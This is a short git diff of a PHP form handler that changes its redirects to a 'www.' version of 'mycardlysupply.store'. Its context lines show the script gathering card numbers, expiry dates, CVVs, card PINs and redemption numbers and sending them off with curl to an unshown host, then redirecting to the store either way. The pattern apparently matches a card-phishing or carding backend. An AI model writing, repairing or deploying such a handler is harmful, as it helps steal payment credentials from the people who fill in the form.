@@ -1,7 +1,6 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "GET") {
-    header('Location: https://mycardlysupply.store/');
-    exit;
+    header('Location: https://www.mycardlysupply.store/');
     exit;
 };
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
@@ -83,15 +82,15 @@ $resp = curl_exec($curl);
 curl_close($curl);
 
 if ($resp === false) {
-    header('Location: https://mycardlysupply.store/');
+    header('Location: https://www.mycardlysupply.store/');
 } else {
-    header('Location: https://mycardlysupply.store/');
+    header('Location: https://www.mycardlysupply.store/');
 };
 
+ 
 } else {
-header('Location: https://mycardlysupply.store/');
-exit;
-};
-
+    header('Location: https://www.mycardlysupply.store/');
+    exit;
+}
 
 ?>
